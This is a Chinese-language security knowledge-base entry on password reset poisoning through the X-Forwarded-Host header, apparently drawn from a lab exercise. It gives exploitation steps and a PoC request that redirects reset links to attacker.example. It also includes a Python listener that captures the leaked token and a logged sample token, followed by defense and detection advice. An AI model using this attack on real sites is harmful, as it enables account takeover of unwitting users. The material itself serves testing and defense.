---
id: web-generic-auth-password-reset-host-header-poisoning
title: 密码重置链接 Host 头注入：X-Forwarded-Host 窃取重置 token
type: scenario
domain: web
path: web/generic/auth
technique: password-reset-host-header-poisoning
aliases:
- X-Forwarded-Host 注入
- Host 头投毒
- 密码重置链接劫持
- reset token 窃取
- password reset poisoning
tags:
- auth
- password-reset
- host-header
- x-forwarded-host
- token-theft
- web
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T01:13:34+08:00'
  notes: 已对照 Level 20 X-Forwarded-Host 请求、攻击者服务器捕获 token 与受害者 bot 点击截图核对；未验证点：未在本机复现，依赖受害者点击
---

## 一句话结论

当密码重置邮件用请求中的 `X-Forwarded-Host`（或 `Host`）拼接重置链接的主机名，攻击者可以伪造该头让受害者收到指向攻击者服务器的链接；受害者点击后，重置 token 会出现在攻击者服务器的请求路径中，攻击者再用该 token 重置受害者密码。

## 原理

- 重置链接通常由服务端拼接：`https://<host>/reset?token=<token>`。如果 `<host>` 取自 `$_SERVER['HTTP_HOST']`、`HTTP_X_FORWARDED_HOST` 或框架的 URL 生成器（信任代理头），客户端就能控制链接域名。
- 攻击者向目标发起“忘记密码”请求，`X-Forwarded-Host: attacker.example`，服务端把重置邮件发给受害者，但链接指向 `attacker.example`。
- 受害者点击后，浏览器向攻击者服务器发送 `GET /reset?token=...`，token 出现在访问日志/请求路径中；攻击者随即在真实站点使用该 token 设置新密码。
- 该漏洞不依赖 token 可预测；token 仍然随机，但通过受害者点击被“外带”到攻击者控制的域名。
- 常见放大：`Host` 头直接注入、`X-Forwarded-Proto`/`X-Forwarded-Port` 影响链接、缓存投毒把恶意 Host 缓存给其他用户。

## 触发条件

- 密码重置邮件中的链接主机名来自请求头（Host/X-Forwarded-Host）而非固定配置。
- 应用/反向代理未校验可信 Host，或未覆盖客户端传入的 XFH。
- 受害者会点击邮件中的重置链接（社工/自动化场景）。
- 攻击者能接收外部 HTTP 请求（公网服务器/DNSLog/内网可达地址）。

## 利用步骤

1. 在攻击者服务器上启动 HTTP 监听（记录请求路径与 Host）。
2. 向目标提交受害者的“忘记密码”请求，添加 `X-Forwarded-Host: attacker.example`（或 `Host: attacker.example`）。
3. 观察受害者邮箱收到的重置邮件，确认链接域名是否变为攻击者域名。
4. 等待受害者点击；攻击者服务器日志中出现 `/reset?token=...`。
5. 提取 token，在真实站点的重置页提交新密码；用新密码登录验证。
6. 若受害者不点击，可尝试自动化/社工；测试环境可用模拟受害者脚本验证链路。

## PoC

恶意请求：

```http
POST /forgot-password.php HTTP/1.1
Host: target
X-Forwarded-Host: attacker.example
Content-Type: application/x-www-form-urlencoded

username=admin
```

攻击者监听（Python 简例）：

```python
import http.server

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print("[+] path:", self.path)
        print("[+] Host:", self.headers.get("Host"))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

http.server.HTTPServer(("0.0.0.0", 8888), H).serve_forever()
```

受害者点击后，日志出现：

```text
/reset?token=5ddccad0189872998890c12e9ec7ad77
```

随后在真实站点使用该 token 重置密码。

## 变体与关联

- 变体：直接注入 `Host` 头；尝试 `X-Forwarded-Proto: https`、`X-Forwarded-Port` 影响链接。
- 变体：缓存投毒——如果重置页/邮件模板被缓存，恶意 Host 可能影响其他用户。
- 变体：通过 `X-Forwarded-Host` 注入到其他邮件（邀请、验证、发票）或 OAuth 回调。
- 关联：[[web-generic-auth-password-reset-username-tampering]]（token 与用户绑定缺陷）。
- 关联：[[web-generic-cache-poisoning-web-cache-deception-url-normalization-mismatch]]（Host/URL 解析差异与缓存）。
- 注意：实际利用需要受害者点击；测试时用授权环境和模拟用户，不要向真实用户发送钓鱼邮件。

## 检测与防御

- 防御：重置链接的主机名使用固定配置（`SITE_URL`/allowlist），不要从请求头动态生成。
- 防御：在反向代理/应用入口校验并覆盖 `Host`、`X-Forwarded-Host`，只接受可信代理设置的值；对 Host 做严格 allowlist。
- 防御：token 一次性、短过期、绑定用户；使用后立即失效；重置成功通知用户并强制下线。
- 检测：重置请求的 `X-Forwarded-Host`/`Host` 与业务域名不一致；邮件链接域名异常；同一 token 从不同 IP 使用；攻击者服务器收到目标域名的重置链接（外部情报）。
